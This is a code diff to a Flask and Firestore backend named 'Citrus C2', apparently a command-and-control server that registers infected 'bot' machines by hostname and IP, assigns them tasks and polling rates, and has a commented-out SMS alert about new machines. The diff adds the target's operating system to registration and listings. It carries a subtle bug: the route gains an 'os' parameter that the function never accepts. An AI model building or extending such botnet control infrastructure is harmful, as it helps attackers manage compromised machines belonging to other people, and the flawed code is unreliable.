@@ -11,6 +11,7 @@ from . import routes
 
 # from dotenv import load_dotenv
 import os
+import string
 
 client_api = Blueprint('client_api', __name__)
 # load_dotenv()
@@ -25,7 +26,7 @@ cred = credentials.Certificate("serviceAccountKey.json")
 firebase_admin.initialize_app(cred)
 db = firestore.client()
 
-@routes.route('/bot/register/<string:hostname>', methods=['POST'])
+@routes.route('/bot/register/<string:os>/<string:hostname>', methods=['POST'])
 def index(hostname):
     id = str(uuid.uuid4())
 
@@ -35,15 +36,17 @@ def index(hostname):
         'hostname': hostname,
         'poll_rate': 5,
         'tasks': [],
+        'os': os
     })
 
     # message = client.messages.create(
     #     to="+17148512888", 
     #     from_="+12185208855",
-    #     body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
+    #     body=f"\n=Citrus C2 Notification: New {string.capwords(os)} Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
     # )
-
     return {'uuid': id}
+
+
 
 
 @routes.route('/bot/poll', methods=['GET'])
@@ -77,6 +80,7 @@ def info():
         tmp['hostname'] = x.to_dict()['hostname']
         tmp['uuid']=x.to_dict()['uuid']
         tmp['ip']=x.to_dict()['ip']
+        tmp['os']=x.to_dict()['os']
         res.append(tmp)
     return jsonify(res)
 
